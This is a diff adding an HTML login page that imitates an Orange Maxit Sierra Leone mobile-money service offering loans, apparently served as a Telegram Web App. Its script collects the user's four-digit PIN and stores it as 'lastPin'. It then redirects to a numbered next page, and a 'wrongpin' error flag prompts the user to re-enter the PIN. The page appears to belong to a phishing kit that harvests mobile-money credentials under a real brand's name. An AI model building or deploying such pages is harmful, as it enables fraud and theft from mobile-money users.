@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Maxit Sierra Leone - Login</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #ff6600;
+            --orange-gradient: linear-gradient(180deg, #ff7a00 0%, #ff6600 100%);
+            --bg-color: #ffffff;
+            --text-dark: #333333;
+            --text-muted: #777777;
+            --border-orange: #ff6600;
+            --btn-disabled-bg: #e2e2e2;
+            --btn-disabled-text: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body { 
+            background-color: var(--bg-color); 
+            margin: 0; 
+            padding: 0;
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+
+        /* Top Header Area */
+        .header-box { 
+            width: 100%; 
+            background: var(--orange-gradient); 
+            padding: 30px 20px 25px; 
+            color: white; 
+            text-align: center; 
+        }
+
+        .header-title {
+            font-size: 32px;
+            font-weight: 800;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .header-title .orange-part { color: #ffffff; opacity: 0.95; margin-right: 6px; }
+        .header-title .money-part { color: #000000; }
+
+        .sub-header-text { 
+            font-size: 14px; 
+            margin-top: 6px; 
+            font-weight: 500;
+            color: #ffffff;
+        }
+
+        /* Content Area */
+        .main-content { 
+            width: 90%; 
+            max-width: 400px; 
+            margin: 25px auto 0; 
+            text-align: center; 
+            flex-grow: 1; 
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h2 { 
+            color: #555555; 
+            font-size: 22px; 
+            margin: 10px 0 25px; 
+            font-weight: 600; 
+        }
+
+        /* Phone Display Field */
+        .phone-display {
+            width: 100%;
+            border: 1.5px solid var(--border-orange);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 30px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #222222;
+            background-color: #ffffff;
+        }
+
+        .flag-icon {
+            font-size: 20px;
+            line-height: 1;
+        }
+
+        /* PIN Section */
+        .pin-label { 
+            color: var(--text-muted); 
+            margin-bottom: 16px; 
+            font-size: 14px; 
+            font-weight: 500; 
+        }
+
+        .pin-wrapper {
+            position: relative;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .pin-input-group { 
+            display: flex; 
+            gap: 12px; 
+        }
+
+        .pin-box {
+            width: 52px;
+            height: 52px;
+            border: 1.5px solid var(--border-orange);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+            background-color: #ffffff;
+        }
+
+        .pin-box:focus {
+            border-width: 2px;
+        }
+
+        .toggle-eye { 
+            position: absolute;
+            right: 0;
+            cursor: pointer; 
+            font-size: 20px; 
+            user-select: none;
+            color: #333333;
+        }
+
+        .forgot-pin {
+            color: var(--text-muted);
+            font-size: 13px;
+            text-decoration: none;
+            margin-bottom: 35px;
+            display: inline-block;
+        }
+
+        /* Submit Button */
+        .btn-submit {
+            background-color: var(--btn-disabled-bg);
+            color: var(--btn-disabled-text);
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: not-allowed;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            transition: background-color 0.2s;
+        }
+
+        .btn-submit.active {
+            background-color: var(--orange-primary);
+            color: #ffffff;
+            cursor: pointer;
+        }
+
+        .btn-submit.active:hover {
+            background-color: #e55c00;
+        }
+
+        .error-banner {
+            background-color: #fde8e8;
+            color: #e74c3c;
+            border: 1px solid #f8b4b4;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            width: 100%;
+            display: none;
+        }
+
+        /* Bottom Curved Footer */
+        .footer-box { 
+            width: 100%; 
+            background: var(--orange-gradient); 
+            padding: 35px 20px 20px; 
+            color: white; 
+            text-align: center; 
+            border-top-left-radius: 50% 30px; 
+            border-top-right-radius: 50% 30px; 
+            margin-top: auto;
+        }
+
+        .footer-title {
+            font-size: 28px;
+            font-weight: 800;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .footer-title .orange-part { color: #ffffff; opacity: 0.95; margin-right: 6px; }
+        .footer-title .money-part { color: #000000; }
+
+        .terms-text { 
+            font-size: 11px; 
+            margin-top: 15px; 
+            padding: 0 20px; 
+            line-height: 1.4; 
+            color: #ffffff;
+        }
+
+        .terms-text u { 
+            color: #ffffff; 
+            cursor: pointer; 
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Section -->
+<div class="header-box">
+    <div class="header-title">
+        <span class="orange-part">Orange</span><span class="money-part">Maxit</span>
+    </div>
+    <div class="sub-header-text">Fast & Simple Loans</div>
+</div>
+
+<!-- Main Login Form -->
+<div class="main-content">
+    <h2>Login</h2>
+
+    <div id="errorDisplay" class="error-banner"></div>
+
+    <div class="phone-display">
+        <span class="flag-icon">🇸🇱</span>
+        <span>+232</span>
+        <span id="displayPhone">--</span>
+    </div>
+
+    <p class="pin-label">Enter your PIN code</p>
+
+    <div class="pin-wrapper">
+        <div class="pin-input-group">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" autocomplete="off">
+        </div>
+        <span class="toggle-eye" id="eyeIcon">👁️‍🗨️</span>
+    </div>
+
+    <a href="#" class="forgot-pin">Forgot PIN?</a>
+
+    <button id="loginBtn" class="btn-submit" disabled>LOGIN</button>
+</div>
+
+<!-- Bottom Curved Footer -->
+<div class="footer-box">
+    <div class="footer-title">
+        <span class="orange-part">Orange</span><span class="money-part">Maxit</span>
+    </div>
+    <div class="sub-header-text">Fast & Simple Loans</div>
+    <p class="terms-text">By logging in, you agree to the <u>Terms and Conditions of Use</u></p>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const loginBtn = document.getElementById('loginBtn');
+    const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
+    const errorDisplay = document.getElementById('errorDisplay');
+
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "76000000";
+    displayPhone.textContent = savedPhone;
+
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get('error') === 'wrongpin') {
+        errorDisplay.innerText = "❌ Incorrect PIN, please try again.";
+        errorDisplay.style.display = "block";
+    }
+
+    pinBoxes.forEach((box, index) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+
+            if (box.value && index < pinBoxes.length - 1) {
+                pinBoxes[index + 1].focus();
+            }
+
+            checkInputs();
+        });
+
+        box.addEventListener('keydown', (e) => {
+            if (e.key === "Backspace" && !box.value && index > 0) {
+                pinBoxes[index - 1].focus();
+            }
+        });
+    });
+
+    function checkInputs() {
+        const filled = [...pinBoxes].every(b => b.value.length === 1);
+        loginBtn.disabled = !filled;
+        loginBtn.classList.toggle('active', filled);
+    }
+
+    eye.addEventListener('click', () => {
+        const isPassword = pinBoxes[0].type === "password";
+        pinBoxes.forEach(b => b.type = isPassword ? "text" : "password");
+    });
+
+    loginBtn.addEventListener('click', () => {
+        if (!loginBtn.classList.contains('active')) return;
+        
+        loginBtn.disabled = true;
+        loginBtn.classList.remove('active');
+
+        let pin = "";
+        pinBoxes.forEach(b => pin += b.value);
+        localStorage.setItem('lastPin', pin);
+
+        errorDisplay.style.display = "none";
+
+        window.location.href = "/page7";
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+</script>
+
+</body>
+</html>
